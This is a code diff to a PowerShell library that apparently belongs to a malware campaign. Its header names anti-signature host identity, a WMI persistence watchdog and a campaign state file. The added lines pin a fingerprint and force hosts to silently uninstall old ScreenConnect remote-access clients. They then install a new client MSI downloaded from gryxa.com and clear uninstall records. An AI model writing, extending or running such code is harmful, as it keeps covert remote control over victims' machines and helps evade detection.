@@ -1,9 +1,9 @@
 #Requires -Version 5.1
 # ═══════════════════════════════════════════════════════════════
-# OWN_LIB  BUILD 20260802L23
+# OWN_LIB  BUILD 20260802L24
 # Shared library: per-host identity (anti-signature), WMI watchdog
 # (mutual persistence chain), campaign state file, SC service repair.
-# L23: Gryxa v2 clean rewrite (state machine, single-flight detached install).
+# L24: GryxaExpectedFp pin — rotate FP => hosts migrate to new FP (fixes only-1-connects).
 # L21: stuck registered (svc+dir gone) -> /fa then ARP nuke + same-FP /i; return fix.
 # L20: -Deep must not skip light start/repair (rate-limit left Gryxa Stopped).
 # L19: rate-limit never blocks when Gryxa fully absent; StartPending keep.
@@ -337,6 +337,9 @@ $script:GryxaMsiUrl = 'https://ui.gryxa.com/Bin/ScreenConnect.ClientSetup.msi?e=
 $script:GryxaRelayHost = 'update.gryxa.com'
 $script:GryxaUiHost = 'ui.gryxa.com'
 $script:SevrzKeep = @('5f6010579852e507', 'f861c8140d453427')
+# Set to a 16-hex FP you WANT installed (after rotating on the panel). Any host
+# running a different FP migrates to this one. Leave '' to just track whatever runs.
+$script:GryxaExpectedFp = ''
 
 function Get-GryxaCfgPath { Join-Path $WorkDir 'gryxa.cfg' }
 
@@ -536,6 +539,31 @@ function Invoke-GryxaEnsure {
     }
 
     $fp = Get-GryxaFp
+
+    # FP rotation: if an expected FP is pinned and the host is on a different one,
+    # migrate (uninstall old FP, install expected) instead of calling the old
+    # running instance "healthy".
+    $exp = $script:GryxaExpectedFp
+    if ($exp) {
+        $runningFp0 = Find-RunningGryxaFp
+        if (($fp -ne $exp) -or ($runningFp0 -and $runningFp0 -ne $exp)) {
+            GLog "fp_drift migrate current=$fp running=$runningFp0 expected=$exp"
+            $msi = Get-GryxaMsi
+            if (-not $msi) { GLog 'msi_unavailable'; return "UNHEALTHY|$exp|msi-unavailable" }
+            $newFp = Get-FpFromProductName (Get-MsiProperty $msi 'ProductName')
+            if (-not $newFp) { $newFp = $exp }
+            foreach ($old in @($fp, $runningFp0) | Where-Object { $_ -and ($_ -ne $newFp) }) {
+                GLog "migrate_uninstall old=$old"
+                $null = Uninstall-ScFingerprint $old
+            }
+            Clear-GryxaArp $newFp
+            Set-GryxaFp $newFp
+            Start-GryxaInstall $msi $newFp (Join-Path $WorkDir 'msi_gryxa_detached.log')
+            Mark-GryxaReinstall
+            return "HEALTHY|$newFp|migrate-spawned=1"
+        }
+    }
+
     $runningFp = Find-RunningGryxaFp
     if ($runningFp) {
         Set-GryxaFp $runningFp
